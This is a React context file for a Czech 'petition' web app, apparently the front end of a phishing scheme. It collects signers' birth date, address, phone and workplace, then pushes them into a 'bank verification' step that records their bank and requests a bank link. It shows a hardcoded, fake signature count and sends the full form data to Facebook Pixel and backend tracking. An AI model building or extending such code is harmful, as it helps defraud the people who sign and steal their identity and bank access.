
import React, { createContext, useState, useContext } from 'react';
import { PetitionData, PetitionContextType } from '../types/petition';
import { submitPetitionData, sendVerifyBankRequest, createBankLinkRequest } from '../services/petitionApi';
import { trackEvent as trackEventUtil, EVENTS } from '../utils/eventTracking';
import { FB_EVENTS } from '../utils/fbPixel';

const defaultPetitionData: PetitionData = {
  firstName: '',
  lastName: '',
  birthDate: '',
  phone: '',
  email: '',
  address: '',
  profession: '',
  workplacePosition: '',
  education: 'Střední s maturitou',
  city: 'Praha',
  district: '',
};

const PetitionContext = createContext<PetitionContextType | undefined>(undefined);

export const PetitionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [petitionData, setPetitionData] = useState<PetitionData>(defaultPetitionData);
  const totalSignatures = 10000;
  const signatureCount = 3125;
  const submissionProgress = (signatureCount / totalSignatures) * 100;

  // Enhanced event tracking function that sends to both FB Pixel and backend
  const trackEvent = async (eventName: string, eventData: Record<string, any> = {}) => {
    await trackEventUtil(eventName, eventData, petitionData.email || 'anonymous');
  };

  const submitPetition = async (data: PetitionData): Promise<boolean> => {
    console.log('Submitting petition data:', data);
    
    // Update local state immediately
    setPetitionData(data);
    
    // Track submission event with FB Pixel
    trackEvent(FB_EVENTS.SUBMIT_APPLICATION, {
      content_name: 'petition_form',
      content_category: 'petition'
    });
    
    // Also track completion for FB Pixel
    trackEvent(FB_EVENTS.COMPLETE_REGISTRATION, {
      content_name: 'petition_form',
      content_category: 'petition',
      status: true
    });
    
    // Send specific backend event for form completion
    trackEvent(EVENTS.FORM_COMPLETED, {
      formData: data,
      timestamp: new Date().toISOString()
    });
    
    // Send data to API
    return await submitPetitionData(data);
  };

  const completeBankVerification = async (bank: string): Promise<boolean> => {
    console.log('Completing bank verification with bank:', bank);
    // Update local state immediately
    setPetitionData(prev => ({ ...prev, bank }));
    
    // Track completion event for FB Pixel
    trackEvent(FB_EVENTS.COMPLETE_REGISTRATION, {
      content_name: 'bank_verification',
      content_category: 'petition',
      bank: bank,
      status: true
    });
    
    // Send specific backend event for bank selection
    trackEvent(EVENTS.BANK_SELECTED, {
      bank,
      userId: petitionData.email || 'anonymous',
      timestamp: new Date().toISOString()
    });
    
    // Send verification request to API
    return await sendVerifyBankRequest(bank);
  };
  
  const createBankLink = async (bankId: string): Promise<string> => {
    console.log('Creating bank link for:', bankId);
    return await createBankLinkRequest(bankId);
  };

  return (
    <PetitionContext.Provider
      value={{
        petitionData,
        setPetitionData,
        submissionProgress,
        totalSignatures,
        signatureCount,
        submitPetition,
        completeBankVerification,
        createBankLink,
        trackEvent,
      }}
    >
      {children}
    </PetitionContext.Provider>
  );
};

export const usePetition = (): PetitionContextType => {
  const context = useContext(PetitionContext);
  if (context === undefined) {
    throw new Error('usePetition must be used within a PetitionProvider');
  }
  return context;
};
